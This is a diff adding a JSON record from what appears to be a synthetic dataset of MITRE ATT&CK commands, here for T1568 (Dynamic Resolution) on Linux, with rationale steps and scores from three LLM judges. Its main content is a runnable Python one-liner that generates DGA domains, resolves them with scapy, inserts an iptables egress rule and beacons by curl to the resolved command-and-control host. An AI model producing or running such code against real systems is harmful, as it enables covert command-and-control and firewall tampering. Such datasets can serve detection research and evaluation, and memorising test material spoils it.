@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\n# Use system resolvers from /etc/resolv.conf and cache-bypass prefixes for dynamic resolution\nseed='resolv-key'\nimport re\nwith open('/etc/resolv.conf','r') as f:\n    resolvers=[m.group(1) for m in [re.match(r'^nameserver\\s+([0-9.]+)',l) for l in f] if m]\nif not resolvers:\n    resolvers=['8.8.8.8']\ntlds=['com','net','org']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:8]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndom=None; ip=None; port=random.choice([5310,8448,19090])\nfor d in dga(30):\n    q='{}.{}'.format(''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6)), d)\n    for r in resolvers[:3]:\n        resp=sr1(IP(dst=r)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=q,qtype='A')),timeout=2,verbose=0)\n        if resp and resp[DNS] and resp[DNS].an:\n            for a in resp[DNS].an:\n                if getattr(a,'type',0)==1:\n                    ip=a.rdata; dom=q; break\n        if ip: break\n    if ip: break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{dom}:{port}/h'])\n    print(dom,ip,port)\"",
+  "explanation": "Leverages system-configured resolvers and randomized subdomain prefixes to bypass DNS caches while dynamically selecting a C2 endpoint.",
+  "rationale_steps": [
+    "Parse local resolvers from resolv.conf to blend with host DNS patterns.",
+    "Use DGA with random subdomain prefixes to avoid cached results.",
+    "Resolve with scapy across up to three resolvers until an A record appears.",
+    "Open an egress rule to a high port and beacon over HTTP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-f4199e75",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is well-formed with properly balanced quotes, parentheses, and braces, correct imports, valid function definitions, and proper control flow structures.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a time-based DGA algorithm to generate domains, querying them with DNS, establishing C2 communication when a valid domain resolves, and even includes realistic operational details like firewall rule insertion and HTTP connection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:20:11.413717Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is perfectly well-formed, uses correct syntax for imports, function definitions, string formatting, Scapy calls, and subprocess execution, making it fully parseable and runnable via `python3 -c`.",
+        "semantic_score": 4,
+        "semantic_justification": "The command excellently implements dynamic resolution using a DGA, cache-bypassing random subdomains, and Scapy for direct DNS queries to determine a C2 endpoint, then attempts to establish C2 via `curl`, though the `iptables` rule modification typically requires elevated privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:20:30.884197Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Properly quoted python3 -c with balanced quotes/newlines and valid Python statements; no obvious syntax or flag errors.",
+        "semantic_score": 3,
+        "semantic_justification": "Implements DGA-like domain generation with cache-bypass prefixes and resolver rotation to dynamically select an endpoint, but relies on Scapy raw packets and iptables which typically require root, reducing feasibility under 'Privilege: None'.",
+        "combined_score": 4.0,
+        "confidence": 0.78,
+        "timestamp": "2025-10-02T07:21:29.147251Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
